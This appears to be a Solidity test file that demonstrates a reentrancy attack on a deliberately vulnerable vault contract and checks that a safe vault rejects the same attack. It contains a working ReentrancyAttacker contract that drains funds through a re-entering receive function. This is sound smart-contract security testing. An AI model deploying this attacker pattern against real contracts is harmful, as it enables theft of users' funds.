// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {VulnerableVault} from "../src/VulnerableVault.sol";
import {SafeVault} from "../src/SafeVault.sol";

interface Vm {
    function deal(address account, uint256 newBalance) external;
    function prank(address sender) external;
    function expectRevert() external;
}

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IVault public immutable vault;
    uint256 public reentries;

    constructor(IVault vault_) {
        vault = vault_;
    }

    function seed() external payable {
        vault.deposit{value: msg.value}();
    }

    function attack(uint256 amount) external {
        vault.withdraw(amount);
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && reentries == 0) {
            reentries = 1;
            vault.withdraw(1 ether);
        }
    }
}

contract ReentrancyTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    function testVulnerableVaultCanBeReentered() external {
        VulnerableVault vault = new VulnerableVault();
        ReentrancyAttacker attacker = new ReentrancyAttacker(IVault(address(vault)));

        vm.deal(address(this), 2 ether);
        vm.prank(address(this));
        vault.deposit{value: 1 ether}();
        attacker.seed{value: 1 ether}();

        attacker.attack(1 ether);

        require(address(attacker).balance == 2 ether, "attacker did not drain twice");
        require(address(vault).balance == 0, "vault still has funds");
    }

    function testSafeVaultRejectsReentry() external {
        SafeVault vault = new SafeVault();
        ReentrancyAttacker attacker = new ReentrancyAttacker(IVault(address(vault)));

        vm.deal(address(this), 2 ether);
        vault.deposit{value: 1 ether}();
        attacker.seed{value: 1 ether}();

        vm.expectRevert();
        attacker.attack(1 ether);

        require(address(vault).balance == 2 ether, "safe vault lost funds");
    }
}
